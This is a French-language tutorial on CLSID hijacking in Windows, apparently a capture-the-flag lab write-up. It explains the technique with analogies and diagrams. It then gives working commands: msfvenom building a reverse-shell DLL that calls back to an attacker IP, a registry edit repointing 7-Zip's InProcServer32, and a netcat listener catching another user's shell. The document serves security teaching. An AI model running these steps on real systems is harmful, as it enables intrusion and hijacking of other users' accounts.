# CLSID Hijacking

### <mark style="color:blue;">C'est quoi en une phrase ? 🤔</mark>

**CLSID Hijacking** = Remplacer la DLL d'un programme (comme 7-Zip) par ta propre DLL malveillante. Quand quelqu'un utilise le programme, ta DLL s'exécute et tu récupères un shell.

***

### <mark style="color:blue;">Analogie de la vie réelle 🏠</mark>

#### <mark style="color:green;">Situation normale</mark>

Imagine un restaurant :

```
Client clique sur "Commander pizza"
    ↓
Le système appelle le cuisinier (DLL légitime)
    ↓
Le cuisinier prépare la pizza
```

#### Avec CLSID Hijacking

```
Tu changes l'adresse du cuisinier dans le système
    ↓
Client clique sur "Commander pizza"
    ↓
Le système appelle TON cuisinier pirate (DLL malveillante)
    ↓
Ton cuisinier te donne un shell au lieu de faire une pizza
```

***

### <mark style="color:blue;">Les concepts à comprendre 📚</mark>

#### <mark style="color:green;">1. Menu contextuel (Context Menu)</mark>

C'est le **menu qui apparaît quand tu fais clic droit** sur un fichier/dossier.

**Exemple** :

```
[Clic droit sur un fichier ZIP] →  ┌─────────────────────┐
                                    │ Ouvrir              │
                                    │ Extraire ici        │ ← Ajouté par 7-Zip
                                    │ Extraire vers...    │ ← Ajouté par 7-Zip
                                    │ Copier              │
                                    │ Supprimer           │
                                    └─────────────────────┘
```

👆 Les options "Extraire" viennent de 7-Zip qui s'est **enregistré** dans Windows.

***

#### <mark style="color:green;">2. DLL (Dynamic Link Library)</mark>

Une **DLL** = Un fichier contenant du code que d'autres programmes peuvent utiliser.

**Exemple** :

```
7-zip.dll = Le fichier qui contient le code de 7-Zip
            (comment extraire, compresser, etc.)
```

Quand tu cliques sur "Extraire ici", Windows **charge** cette DLL et exécute son code.

***

#### <mark style="color:green;">3. CLSID (Class Identifier)</mark>

Un **CLSID** = Un identifiant unique (comme une carte d'identité) pour un programme/composant dans Windows.

**Format** :

```
{23170F69-40C1-278A-1000-000100020000}
    ↑
    C'est comme un numéro de sécurité sociale, mais pour 7-Zip
```

***

#### <mark style="color:green;">4. Registre Windows</mark>

Le **registre** = Une énorme base de données où Windows stocke toutes ses configurations.

**Analogie** : C'est comme un annuaire téléphonique géant qui dit :

```
"Quand quelqu'un clique sur l'option 7-Zip du menu contextuel,
 appelle ce fichier DLL à cette adresse"
```

***

### <mark style="color:blue;">Comment ça marche normalement ? ⚙️</mark>

#### Configuration légitime

```
┌─────────────────────────────────────────────────────────┐
│ 1. Tu fais clic droit sur un dossier                    │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 2. Windows regarde dans le registre :                   │
│    "Qui gère les menus contextuels pour les dossiers ?" │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 3. Registre répond : "7-Zip ! Son CLSID est {23170...}" │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 4. Windows demande : "Où est la DLL de ce CLSID ?"     │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 5. Registre répond : "C:\Program Files\7-Zip\7-zip.dll" │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 6. Windows charge 7-zip.dll et affiche le menu 7-Zip   │
└─────────────────────────────────────────────────────────┘
```

***

### <mark style="color:blue;">L'attaque CLSID Hijacking 💣</mark>

#### <mark style="color:green;">Qu'est-ce qu'on fait ?</mark>

On **modifie l'adresse de la DLL dans le registre** pour pointer vers **notre DLL malveillante** au lieu de la vraie.

#### <mark style="color:green;">Schéma de l'attaque</mark>

```
┌─────────────────────────────────────────────────────────┐
│ 1. AVANT (configuration normale)                        │
│                                                          │
│ Registre dit :                                          │
│ CLSID {23170...} → C:\Program Files\7-Zip\7-zip.dll    │
│                           ↑                             │
│                    DLL LÉGITIME                         │
└─────────────────────────────────────────────────────────┘

                    ↓ ON MODIFIE ↓

┌─────────────────────────────────────────────────────────┐
│ 2. APRÈS (configuration piratée)                        │
│                                                          │
│ Registre dit :                                          │
│ CLSID {23170...} → C:\ProgramData\malicious.dll         │
│                           ↑                             │
│                    TA DLL MALVEILLANTE                  │
└─────────────────────────────────────────────────────────┘
```

#### <mark style="color:green;">Que se passe-t-il maintenant ?</mark>

```
┌─────────────────────────────────────────────────────────┐
│ 1. Victime fait clic droit sur un dossier              │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 2. Windows cherche la DLL de 7-Zip                     │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 3. Registre dit : "C:\ProgramData\malicious.dll"       │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 4. Windows charge TA DLL au lieu de celle de 7-Zip     │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ 5. Ta DLL s'exécute → Reverse shell vers toi !         │
└─────────────────────────────────────────────────────────┘
```

***

### <mark style="color:blue;">Exemple concret étape par étape 🎯</mark>

#### Situation initiale

Tu as un shell en tant que **ee.reed** (groupe Support) sur la machine Windows.

#### Étape 1 : Créer ta DLL malveillante

```bash
# Sur ta machine Kali
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.6 \
  LPORT=443 \
  -f dll \
  -o malicious.dll
```

**Ce que ça fait** : Crée une DLL qui, quand elle est chargée, se connecte à toi (10.10.14.6:443) et te donne un shell.

***

#### Étape 2 : Upload de la DLL

```powershell
# Depuis ton shell Windows (Evil-WinRM)
upload malicious.dll C:\ProgramData\malicious.dll
```

**Ce que ça fait** : Met ta DLL sur la machine cible dans un dossier accessible.

***

#### Étape 3 : Trouver le CLSID de 7-Zip

```powershell
# Chercher où 7-Zip est enregistré
Get-ItemProperty "Registry::HKCR\Directory\shellex\ContextMenuHandlers\7-Zip"

# Résultat :
# (default) : {23170F69-40C1-278A-1000-000100020000}
```

**Ce que ça fait** : Récupère l'identifiant unique de 7-Zip.

***

#### Étape 4 : Voir où pointe actuellement ce CLSID

```powershell
Get-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"

# Résultat AVANT modification :
# (default) : C:\Program Files\7-Zip\7-zip.dll
```

**Ce que ça fait** : Montre quelle DLL est actuellement utilisée (la légitime).

***

#### Étape 5 : Modifier le registre pour pointer vers ta DLL

```powershell
Set-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32" `
  -Name "(default)" `
  -Value "C:\ProgramData\malicious.dll"
```

**Ce que ça fait** : Change l'adresse dans le registre pour pointer vers **ta DLL** au lieu de celle de 7-Zip.

***

#### Étape 6 : Vérifier la modification

```powershell
Get-ItemProperty "Registry::HKCR\CLSID\{23170F69-40C1-278A-1000-000100020000}\InProcServer32"

# Résultat APRÈS modification :
# (default) : C:\ProgramData\malicious.dll  ✅
```

***

#### Étape 7 : Préparer ton listener

```bash
# Sur ta machine Kali
nc -lvnp 443
```

**Ce que ça fait** : Écoute sur le port 443 en attente de connexion.

***

#### Étape 8 : Attendre qu'une victime utilise 7-Zip

```
┌─────────────────────────────────────────────────────────┐
│ Utilisateur mm.turner (sur la machine)                  │
│                                                          │
│ 1. Ouvre l'explorateur Windows                          │
│ 2. Fait clic droit sur un dossier                       │
│ 3. Voit les options 7-Zip dans le menu                  │
│ 4. Clique sur "Extraire ici" ou n'importe quelle option│
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ Windows charge C:\ProgramData\malicious.dll             │
│ (au lieu de la vraie DLL de 7-Zip)                     │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│ Ta DLL s'exécute en tant que mm.turner                  │
│ Reverse shell se connecte à toi !                       │
└─────────────────────────────────────────────────────────┘
```

***

#### Étape 9 : Tu reçois le shell

```bash
# Sur ta machine Kali
nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.75 51291

C:\Windows>whoami
rustykey\mm.turner
```

***
